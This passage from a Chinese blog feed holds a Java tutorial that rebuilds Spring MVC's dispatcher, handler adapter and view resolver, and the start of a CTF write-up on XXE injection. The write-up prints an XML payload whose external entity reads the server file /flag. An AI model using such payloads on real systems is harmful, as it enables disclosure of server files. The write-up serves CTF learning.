&#125;      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;          e.printStackTrace();      &#125;  &#125;</code></pre></div></li></ul><h2 id="MyHandlerAdapter创建"><a href="#MyHandlerAdapter创建" class="headerlink" title="MyHandlerAdapter创建"></a>MyHandlerAdapter创建</h2><ul><li><p>HandlerAdapter主要完成请求传递到服务端的参数列表与Method实参列表的对应关系，完成参数值的类型转换工作。核心方法是handle()。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandlerAdapter</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span>&#123;        <span class="hljs-keyword">return</span> (handler <span class="hljs-keyword">instanceof</span> MyHandlerMapping);    &#125;    <span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp,Object handler)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div></li><li><p>暂时先这样，再创建一个MyModelAndView类</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModelAndView</span> &#123;&#125;</code></pre></div></li><li><p>DispatcherServlet完善initHandlerAdapters方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerAdapters</span><span class="hljs-params">(MyApplicationContext context)</span> &#123;    <span class="hljs-comment">//初始化阶段，我们能做的就是将这些参数的名字或者类型按一定的顺序保存下来</span>    <span class="hljs-comment">//因为后面用反射调用的时候，传的参数是一个数组</span>    <span class="hljs-comment">//可以通过记录这些参数的位置index，逐个从数组中取值，这样就和参数的顺序无关了</span>    <span class="hljs-keyword">for</span> (MyHandlerMapping handlerMapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;        <span class="hljs-built_in">this</span>.handlerAdaptors.put(handlerMapping,<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandlerAdapter</span>());    &#125;&#125;</code></pre></div></li></ul><h2 id="MyViewResolver创建"><a href="#MyViewResolver创建" class="headerlink" title="MyViewResolver创建"></a>MyViewResolver创建</h2><ul><li><p>&#96;&#96;&#96;java<br>package com.czh.spring.framework.webmvc;</p><p>public class MyViewResolver {<br>}</p><div class="code-wrapper"><pre><code class="hljs reasonml">- DispatcherServlet完善initViewResolvers方法  ```java     <span class="hljs-keyword">private</span> void init<span class="hljs-constructor">ViewResolvers(MyApplicationContext <span class="hljs-params">context</span>)</span> &#123;          <span class="hljs-comment">//解决页面名字和模版文件关联问题</span>          String templateRoot = context.get<span class="hljs-constructor">Config()</span>.get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;templateRoot&quot;</span>)</span>;          String templateRootPath = this.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">ClassLoader()</span>.get<span class="hljs-constructor">Resource(<span class="hljs-params">templateRoot</span>)</span>.get<span class="hljs-constructor">File()</span>;            File templateRootDir = <span class="hljs-keyword">new</span> <span class="hljs-constructor">File(<span class="hljs-params">templateRootPath</span>)</span>;          String<span class="hljs-literal">[]</span> templates = templateRootDir.<span class="hljs-built_in">list</span><span class="hljs-literal">()</span>;          <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; templates.length; i++) &#123;              <span class="hljs-comment">//这里主要是为了兼容多模板，所有模仿Spring用List保存</span>              <span class="hljs-comment">//在我写的代码中简化了，其实只有需要一个模板就可以搞定</span>              <span class="hljs-comment">//只是为了仿真，所有还是搞了个List</span>              this.viewResolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-constructor">MyViewResolver(<span class="hljs-params">templateRoot</span>)</span>);          &#125;      &#125;</code></pre></div></li></ul><h2 id="DispatcherServlet中Service方法"><a href="#DispatcherServlet中Service方法" class="headerlink" title="DispatcherServlet中Service方法"></a>DispatcherServlet中Service方法</h2><ul><li><p>初始化都整完了，来看service()方法，主要负责接收请求，得到Request和Response对象。在Servlet子类的service()方法被拆分成doGet()和doPost()方法。真正调用逻辑用doDispatch()来执行。</p><div class="code-wrapper"><pre><code class="hljs java">    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">this</span>.doPost(req,resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-keyword">try</span> &#123;            doDispatch(req,resp);        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            resp.getWriter().write(<span class="hljs-string">&quot;500 Exception,Details:\r\n&quot;</span> +                     Arrays.toString(e.getStackTrace())                            .replaceAll(<span class="hljs-string">&quot;\\[|\\]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)                            .replaceAll(<span class="hljs-string">&quot;,\\s&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>));            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">//根据用户请求的URL来获得一个Handler</span>        <span class="hljs-type">MyHandlerMapping</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getHandler(req);        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == handler)&#123;            processDispatchResult(req,resp,<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyModelAndView</span>(<span class="hljs-string">&quot;404&quot;</span>));            <span class="hljs-keyword">return</span>;        &#125;                <span class="hljs-type">MyHandlerAdapter</span> <span class="hljs-variable">handlerAdapter</span> <span class="hljs-operator">=</span> getHandlerAdapter(handler);        <span class="hljs-type">MyModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> handlerAdapter.handle(req, resp, handler);                processDispatchResult(req,resp,mv);    &#125;    <span class="hljs-keyword">private</span> MyHandlerAdapter <span class="hljs-title function_">getHandlerAdapter</span><span class="hljs-params">(MyHandlerMapping handler)</span> &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.handlerAdaptors.isEmpty())<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        <span class="hljs-type">MyHandlerAdapter</span> <span class="hljs-variable">handlerAdapter</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.handlerAdaptors.get(handler);        <span class="hljs-keyword">if</span>(handlerAdapter.supports(handler))&#123;            <span class="hljs-keyword">return</span> handlerAdapter;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response,MyModelAndView mv)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-comment">//调用viewResolver的resolveViewName()方法</span>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == mv)<span class="hljs-keyword">return</span>;                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.viewResolvers.isEmpty())<span class="hljs-keyword">return</span>;                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.viewResolvers != <span class="hljs-literal">null</span>)&#123;            <span class="hljs-keyword">for</span> (MyViewResolver viewResolver : viewResolvers) &#123;                <span class="hljs-type">MyView</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> viewResolver.resolveViewName(mv.getViewName(),<span class="hljs-literal">null</span>);                <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != view)&#123;                    view.render(mv.getModel(),request,response);                    <span class="hljs-keyword">return</span>;                &#125;            &#125;        &#125;    &#125;    <span class="hljs-keyword">private</span> MyHandlerMapping <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.handlerMappings.isEmpty())<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> req.getRequestURI();        <span class="hljs-type">String</span> <span class="hljs-variable">contextPath</span> <span class="hljs-operator">=</span> req.getContextPath();        uri = uri.replace(contextPath,<span class="hljs-string">&quot;&quot;</span>).replaceAll(<span class="hljs-string">&quot;/+&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);        <span class="hljs-keyword">for</span> (MyHandlerMapping handler : handlerMappings) &#123;            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> handler.getPattern().matcher(uri);            <span class="hljs-keyword">if</span>(!matcher.matches())<span class="hljs-keyword">continue</span>;            <span class="hljs-keyword">return</span> handler;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div></li></ul><h2 id="补全MyHandlerAdapter"><a href="#补全MyHandlerAdapter" class="headerlink" title="补全MyHandlerAdapter"></a>补全MyHandlerAdapter</h2><ul><li><p>在handle()中利用反射来调用被适配的目标方法，并将转换好的参数列表传递过去</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp,Object handler)</span><span class="hljs-keyword">throws</span> Exception&#123;    <span class="hljs-type">MyHandlerMapping</span> <span class="hljs-variable">handlerMapping</span> <span class="hljs-operator">=</span> (MyHandlerMapping) handler;      <span class="hljs-comment">//每个方法都有一个参数列表，这里保存的是形参列表</span>    HashMap&lt;String, Integer&gt; paramMapping = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();      <span class="hljs-comment">//这里只是给出命名参数</span>    Annotation[][] pa = handlerMapping.getMethod().getParameterAnnotations();    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; pa.length; i++) &#123;        <span class="hljs-keyword">for</span> (Annotation a : pa[i]) &#123;            <span class="hljs-keyword">if</span>(a <span class="hljs-keyword">instanceof</span> MyRequestParam)&#123;                <span class="hljs-type">String</span> <span class="hljs-variable">paramName</span> <span class="hljs-operator">=</span> ((MyRequestParam) a).value();                <span class="hljs-keyword">if</span>(!<span class="hljs-string">&quot;&quot;</span>.equals(paramName.trim()))&#123;                    paramMapping.put(paramName,i);                &#125;            &#125;        &#125;    &#125;      <span class="hljs-comment">//根据用户请求的参数信息，跟Method中的参数信息进行动态匹配</span>    <span class="hljs-comment">//resp 传进来的目的只有一个：将其赋值给方法参数，仅此而已</span>      <span class="hljs-comment">//只有当用户传过来的ModelAndView为空的时候，才会默认新建一个默认的</span>      <span class="hljs-comment">//1.要准备好这个方法的形参列表</span>    <span class="hljs-comment">//方法重载时形参的决定因素1：参数的个数、参数的类型、参数顺序、方法的名字</span>    <span class="hljs-comment">//只处理Request和Response</span>    Class&lt;?&gt;[] paramTypes = handlerMapping.getMethod().getParameterTypes();    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; paramTypes.length; i++) &#123;        Class&lt;?&gt; type = paramTypes[i];        <span class="hljs-keyword">if</span>(type == HttpServletRequest.class || type == HttpServletResponse.class)&#123;            paramMapping.put(type.getName(),i);        &#125;    &#125;      <span class="hljs-comment">//2.得到自定义命名参数的所在位置</span>    <span class="hljs-comment">//用户通过URL传过来的参数列表</span>    Map&lt;String,String[]&gt; parameterMap = req.getParameterMap();      <span class="hljs-comment">//3.构造实参列表</span>    Object[] paramValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[paramTypes.length];      <span class="hljs-keyword">for</span> (Map.Entry&lt;String, String[]&gt; param : parameterMap.entrySet()) &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> Arrays.toString(param.getValue()).replaceAll(<span class="hljs-string">&quot;\\[|\\]&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replaceAll(<span class="hljs-string">&quot;\\s&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);          <span class="hljs-keyword">if</span>(!paramMapping.containsKey(param.getKey()))<span class="hljs-keyword">continue</span>;          <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> paramMapping.get(param.getKey());          <span class="hljs-comment">//因为页面传过来的值都是String类型的，而在方法中定义的类型是千变万化的，</span>        <span class="hljs-comment">//所以要针对我们传过来的参数进行类型转换</span>        paramValues[index] = caseStringValue(value,paramTypes[index]);    &#125;      <span class="hljs-keyword">if</span>(paramMapping.containsKey(HttpServletRequest.class.getName()))&#123;        <span class="hljs-type">int</span> <span class="hljs-variable">reqIndex</span> <span class="hljs-operator">=</span> paramMapping.get(HttpServletRequest.class.getName());        paramValues[reqIndex] = req;    &#125;      <span class="hljs-keyword">if</span>(paramMapping.containsKey(HttpServletResponse.class.getName()))&#123;        <span class="hljs-type">int</span> <span class="hljs-variable">respIndex</span> <span class="hljs-operator">=</span> paramMapping.get(HttpServletResponse.class.getName());        paramValues[respIndex] = resp;    &#125;      <span class="hljs-comment">//4.从handler中取出Controller、Method，然后利用反射机制进行调用</span>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> handlerMapping.getMethod().invoke(handlerMapping.getController(), paramValues);    <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == result)<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;      <span class="hljs-type">boolean</span> <span class="hljs-variable">isModelAndView</span> <span class="hljs-operator">=</span> handlerMapping.getMethod().getReturnType() == MyModelAndView.class;    <span class="hljs-keyword">if</span>(isModelAndView)&#123;        <span class="hljs-keyword">return</span> (MyModelAndView) result;    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;  <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">caseStringValue</span><span class="hljs-params">(String value, Class&lt;?&gt; clazz)</span> &#123;    <span class="hljs-keyword">if</span>(clazz == String.class)&#123;        <span class="hljs-keyword">return</span> value;    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(clazz == Integer.class)&#123;        <span class="hljs-keyword">return</span> Integer.valueOf(value);    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(clazz == <span class="hljs-type">int</span>.class)&#123;        <span class="hljs-keyword">return</span> Integer.valueOf(value).intValue();    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div></li></ul><h2 id="补全MyModelAndView"><a href="#补全MyModelAndView" class="headerlink" title="补全MyModelAndView"></a>补全MyModelAndView</h2><ul><li><p>原生sprng中ModelAndView类主要用于封装页面模版和往页面中传送参数的对应关系</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-meta">@Data</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModelAndView</span> &#123;    <span class="hljs-keyword">private</span> String viewName;<span class="hljs-comment">//页面模版名称</span>    <span class="hljs-keyword">private</span> Map&lt;String,?&gt; model;<span class="hljs-comment">//往页面传送的参数</span>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyModelAndView</span><span class="hljs-params">(String viewName)</span> &#123; <span class="hljs-built_in">this</span>.viewName = viewName; &#125;&#125;</code></pre></div></li></ul><h2 id="补全MyViewResolver"><a href="#补全MyViewResolver" class="headerlink" title="补全MyViewResolver"></a>补全MyViewResolver</h2><ul><li><p>ViewResolver主要完成模版名称和模版解析引擎的匹配，通过在Serlvet中调用resolveViewName()方法来获取对应模版所对应的View。</p></li><li><p>这里暂时只实现以一套默认的模版引擎，语法也是完全自定义。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.util.Locale;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 任务1：将一个静态文件变成一个动态文件</span><span class="hljs-comment"> * 任务2：根据用户传送不同的参数，产生不同的结果，最终输出字符串，交给Response输出</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewResolver</span> &#123;    <span class="hljs-comment">//默认解析html文件</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_TEMPLATE_SUFFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.html&quot;</span>;        <span class="hljs-keyword">private</span> File templateRootDir;        <span class="hljs-keyword">private</span> String viewName;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyViewResolver</span><span class="hljs-params">(String templateRoot)</span>&#123;        <span class="hljs-type">String</span> <span class="hljs-variable">templateRootPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(templateRoot).getFile();        <span class="hljs-built_in">this</span>.templateRootDir = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(templateRootPath);    &#125;        <span class="hljs-keyword">public</span> MyView <span class="hljs-title function_">resolveViewName</span><span class="hljs-params">(String viewName, Locale locale)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-built_in">this</span>.viewName = viewName;        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == viewName || <span class="hljs-string">&quot;&quot;</span>.equals(viewName.trim()))<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        viewName = viewName.endsWith(DEFAULT_TEMPLATE_SUFFIX)?viewName:(viewName+DEFAULT_TEMPLATE_SUFFIX);        <span class="hljs-type">File</span> <span class="hljs-variable">templateFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>((templateRootDir.getPath() + <span class="hljs-string">&quot;/&quot;</span> + viewName).replaceAll(<span class="hljs-string">&quot;/+&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>));        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyView</span>(templateFile);    &#125;        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getViewName</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> viewName;    &#125;&#125;</code></pre></div></li></ul><h2 id="MyView"><a href="#MyView" class="headerlink" title="MyView"></a>MyView</h2><ul><li><p>自定义模版引擎，核心方法是render()，在render()方法中完成对模版的渲染，最终返回浏览器能识别的字符串，通过response输出</p></li><li><p>我所实现的View是基于HTML文件来对页面进行渲染的，模版表达式为¥{name}</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.RandomAccessFile;<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.regex.Matcher;<span class="hljs-keyword">import</span> java.util.regex.Pattern;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyView</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_CONTENT_TYPE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>;    <span class="hljs-keyword">private</span> File viewFile;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyView</span><span class="hljs-params">(File viewFile)</span>&#123;        <span class="hljs-built_in">this</span>.viewFile = viewFile;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getContentType</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> DEFAULT_CONTENT_TYPE;    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();        <span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">ra</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(<span class="hljs-built_in">this</span>.viewFile, <span class="hljs-string">&quot;r&quot;</span>);        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;            <span class="hljs-keyword">while</span> (<span class="hljs-literal">null</span> != (line = ra.readLine()))&#123;                line = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(line.getBytes(StandardCharsets.ISO_8859_1),StandardCharsets.UTF_8);                <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;¥\\&#123;[^\\&#125;]+\\&#125;&quot;</span>, Pattern.CASE_INSENSITIVE);                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(line);                                <span class="hljs-keyword">while</span> (matcher.find())&#123;                    <span class="hljs-type">String</span> <span class="hljs-variable">paramName</span> <span class="hljs-operator">=</span> matcher.group();                    paramName = paramName.replaceAll(<span class="hljs-string">&quot;¥\\&#123;|\\&#125;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);                    <span class="hljs-type">Object</span> <span class="hljs-variable">paramValue</span> <span class="hljs-operator">=</span> model.get(paramName);                    <span class="hljs-comment">//要把¥&#123;&#125;中间的这个字符取出来</span>                    line = matcher.replaceFirst(makeStringForRegExp(paramName.toString()));                    matcher = pattern.matcher(line);                &#125;                sb.append(line);            &#125;        &#125; <span class="hljs-keyword">finally</span> &#123;            ra.close();        &#125;        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);        response.getWriter().write(sb.toString());    &#125;    <span class="hljs-comment">//处理特殊字符</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">makeStringForRegExp</span><span class="hljs-params">(String str)</span> &#123;        <span class="hljs-keyword">return</span> str.replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;\\\\&quot;</span>).replace(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;\\*&quot;</span>)                .replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;\\+&quot;</span>).replace(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;\\|&quot;</span>)                .replace(<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;\\&#123;&quot;</span>).replace(<span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;\\&#125;&quot;</span>)                .replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;\\(&quot;</span>).replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;\\)&quot;</span>)                .replace(<span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;\\^&quot;</span>).replace(<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;\\$&quot;</span>)                .replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;\\[&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;\\]&quot;</span>)                .replace(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;\\?&quot;</span>).replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;\\,&quot;</span>)                .replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;\\.&quot;</span>).replace(<span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;\\&amp;&quot;</span>);    &#125;&#125;</code></pre></div></li></ul><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><ul><li><p>application.properties</p><div class="code-wrapper"><pre><code class="hljs yml"><span class="hljs-comment">#托管的类扫描包路径#</span><span class="hljs-string">scanPackage=com.czh.spring.demo</span><span class="hljs-string">templateRoot=layouts</span></code></pre></div></li><li><p>打war包运行在tomcat上</p></li><li><p>访问<a href="http://localhost:8080/luelueking_Spring_Source_war/">http://localhost:8080/luelueking_Spring_Source_war/</a></p><p><img src="https://img-blog.csdnimg.cn/a44034a8dd20448c9c60001b8ffba403.png" alt="请添加图片描述"></p></li><li><p>访问<a href="http://localhost:8080/luelueking_Spring_Source_war/web/add.json?name=luelueking&amp;address=China">http://localhost:8080/luelueking_Spring_Source_war/web/add.json?name=luelueking&amp;address=China</a></p><p><img src="https://img-blog.csdnimg.cn/ac7ffe114cf24075b30d71106435581a.png" alt="请添加图片描述"></p></li><li><p>访问<a href="http://localhost:8080/luelueking_Spring_Source_war/first.html?name=luelueking">http://localhost:8080/luelueking_Spring_Source_war/first.html?name=luelueking</a><br><img src="https://img-blog.csdnimg.cn/6ef1ed16c2834486ac6c02a80472a950.png" alt="请添加图片描述"></p></li><li><p>其他自己测，可能会有小bug，不过相信你自己可以解决</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浅尝XXE漏洞[NCTF2019]Fake XML cookbook</title>
    <link href="/2022/08/15/XXE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/08/15/XXE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>ps：一点骚话：最近WP写的不是很勤快了，一方面是ctf上的学习好像来到了瓶颈期，题目的难度不断上升（加上大佬的WP写的很好，自愧不如），自己经常只能停留在复现的状态，二是一方面其实我已经认识到开发与安全二者之间密切的关系，所以有在捣鼓一些别的东西，虽然前期可能对打比赛帮助微弱，但我认为这是我技术方向内功的积累。路还很长，还是得坚持，最近可能要多做总结，目前在积累一些姿势库，后续会更新。。。还是看正文吧。</p><h3 id="NCTF2019-Fake-XML-cookbook-WriteUp"><a href="#NCTF2019-Fake-XML-cookbook-WriteUp" class="headerlink" title="[NCTF2019]Fake XML cookbook WriteUp"></a>[NCTF2019]Fake XML cookbook WriteUp</h3><ul><li><p>打开题目 经典登录 盲猜sql 实则偏题 一看标题 XMLbook 网上一搜 XXE漏洞</p><p><img src="https://img-blog.csdnimg.cn/dea273ad54d9411eac319c0e42bd5fd0.png" alt="在这里插入图片描述"></p></li><li><p>XXE 全称XML External Entity Injection 即XML外部实体注入（在我看来就是注入xml类型数据搞点花罢了）</p></li><li><p>先看这题payload</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><span class="hljs-meta">  ]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/cba5fd6edd3e47c3a22ab281ea693956.png" alt="在这里插入图片描述"></p></li><li><p>可以看出是读取了flag文件的内容，注意这里因为将<code>file:///flag</code>命名为admin，所以下面用&amp;admin</p></li><li><p>下面就是学习了，浅学之后总结一下：</p></li></ul><h3 id="挖掘xxe肉冻"><a href="#挖掘xxe肉冻" 